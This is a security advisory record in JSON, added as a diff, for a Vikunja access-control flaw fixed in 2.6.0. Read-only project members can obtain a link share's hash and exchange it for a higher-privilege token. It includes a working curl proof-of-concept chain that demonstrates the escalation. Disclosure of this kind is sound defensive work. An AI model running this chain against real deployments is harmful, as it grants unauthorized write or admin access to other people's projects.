@@ -1,0 +1,66 @@
+{
+  "id": "GHSA-qfwc-vx6f-3g6g",
+  "modified": "2026-10-09T21:00:10.912557707Z",
+  "published": "2026-10-09T20:51:29Z",
+  "aliases": [
+    "CVE-2026-91985"
+  ],
+  "summary": "Vikunja: Read-only project members can obtain any link share's access hash via the single-share read endpoint (v1 and v2) and escalate to the share's permission level",
+  "details": "## Summary\n\nA user who has only read permission on a project can call the single link-share read endpoint and receive the share's `hash` field — the secret credential that the anonymous `POST /shares/{share}/auth` endpoint exchanges for a link-share JWT carrying the share's permission (read / read-write / admin). A read-only member can therefore mint a write- or admin-level token for the project and perform writes they are not entitled to, while their own user token is correctly refused. This is the remaining variant of the link-share hash disclosure class: GHSA-8hp8-9fhr-pfm9 fixed the list endpoint (ReadAll now requires project admin) but the single-read endpoint's gate was never aligned. Verified on Vikunja 2.5.0; the weak gate has existed since the endpoint, so earlier versions are likely affected too.\n\n## Details\n\nAffected endpoints (both verified with a complete chain):\n\n- v1: `GET /api/v1/projects/{project}/shares/{share}`\n- v2: `GET /api/v2/projects/{project}/shares/{share}`\n\nPermission gate: `LinkSharing.CanRead` (`pkg/models/link_sharing_permissions.go`) delegates to `project.CanRead(s, a)` — i.e. any user with read access to the project passes. The response serializes the `hash` field (`pkg/models/link_sharing.go`, field tag `json:\"hash\"`), which is the share's bearer credential. The share `password` field is correctly cleared before returning, but the hash is not restricted.\n\nInconsistent with the sibling list endpoint `GET /projects/{project}/shares` (`LinkSharing.ReadAll`, `pkg/models/link_sharing.go:243-256`), which requires `project.IsAdmin` — the protection level the project chose when the class was fixed for the list endpoint in 2.3.0 (GHSA-8hp8). The v1 and v2 APIs share the same model-level gate (the v2 `handler.DoReadOne` wrappers call the same `CanRead`), so both surfaces are affected.\n\nImpact chain: hash -\u003e `POST /api/v1/shares/{hash}/auth` (unauthenticated by design) -\u003e link-share JWT at the share's permission level -\u003e full API access at that level for that project.\n\nMitigating factors: the attacker must already be a member of the project at read level; password-protected shares (sharing_type=2) still require the password at the auth step; share IDs are small sequential integers and enumerable by members.\n\n## PoC\n\nSteps below use two accounts: the owner (token `$OWNER`) and an attacker who has been granted read-only access to the project (token `$READER`). All requests were executed against a local Vikunja 2.5.0 instance.\n\n1. Owner creates a private project and a read-write link share (permission=1):\n\n```\ncurl -X PUT \"$BASE/api/v1/projects\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"poc\"}'\n# -\u003e {\"id\":123,...}\n\ncurl -X PUT \"$BASE/api/v1/projects/123/shares\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"name\":\"poc\",\"permission\":1}'\n# -\u003e {\"id\":7,\"hash\":\"\u003cSECRET_HASH\u003e\",...}\n```\n\n2. Owner adds the attacker as a read-only member (permission=0):\n\n```\ncurl -X PUT \"$BASE/api/v1/projects/123/users\" -H \"Authorization: Bearer $OWNER\" \\\n  -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"permission\":0}'\n```\n\n3. Attacker reads the single share — the weak gate — and receives the hash (this is the disclosure; the list endpoint would correctly return 403 here):\n\n```\ncurl \"$BASE/api/v1/projects/123/shares/7\" -H \"Authorization: Bearer $READER\"\n# -\u003e 200 {\"id\":7,\"hash\":\"\u003cSECRET_HASH\u003e\",\"permission\":1,...}\n# v2 twin behaves identically:\ncurl \"$BASE/api/v2/projects/123/shares/7\" -H \"Authorization: Bearer $READER\"\n# -\u003e 200 {\"hash\":\"\u003cSECRET_HASH\u003e\",...}\n```\n\n4. Attacker exchanges the hash for a link-share JWT (no authentication required):\n\n```\ncurl -X POST \"$BASE/api/v1/shares/\u003cSECRET_HASH\u003e/auth\" \\\n  -H 'Content-Type: application/json' -d '{}'\n# -\u003e 200 {\"token\":\"\u003cLINK_JWT\u003e\",...}\n```\n\n5. Negative control — the attacker's own user token cannot write to the project:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects/123/tasks\" -H \"Authorization: Bearer $READER\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"direct\"}'\n# -\u003e 403 Forbidden\n```\n\n6. Escalation proof — the link-share JWT writes successfully:\n\n```\ncurl -X PUT \"$BASE/api/v1/projects/123/tasks\" -H \"Authorization: Bearer \u003cLINK_JWT\u003e\" \\\n  -H 'Content-Type: application/json' -d '{\"title\":\"escalated\"}'\n# -\u003e 201 Created\n```\n\nObserved result: steps 3, 4 and 6 all succeed (200 / 200 / 201) while step 5 is refused with 403 — the read-only member has escalated to write access. If the project has an admin-level share (permission=2), the same chain yields project-admin capabilities (member management is still refused for link principals, but project settings, shares of the project, and all write operations become available).\n\n## Impact\n\nBroken access control / privilege escalation within shared projects (CWE-862, CWE-639: the link-share hash is a bearer capability disclosed to a lesser-privileged member; CWE-200 for the information exposure). Any read-level member of a project that has a link share can escalate to that share's permission level: write members' tasks/comments can be created and modified; an admin-level share additionally grants project settings and share management for the project. Confidentiality is also affected insofar as the hash itself is the project's shared secret. Suggested fix: require `project.IsAdmin` in `LinkSharing.CanRead` (aligning with `ReadAll`), or omit the `hash` field from responses to non-admin members.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.vikunja.io/api",
+        "purl": "pkg:golang/code.vikunja.io/api"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.6.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.5.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-qfwc-vx6f-3g6g/GHSA-qfwc-vx6f-3g6g.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-qfwc-vx6f-3g6g"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-91985"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/pull/3688"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/commit/077dc4de79ce6f1ab59215a2c7bf9b30423685f2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-vikunja/vikunja"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0"
+    },
+    {
+      "type": "WEB",
+      "url": "https://www.vulncheck.com/advisories/vikunja-before-2.6.0-privilege-escalation-via-link-share-hash"
+    }
+  ]
+}
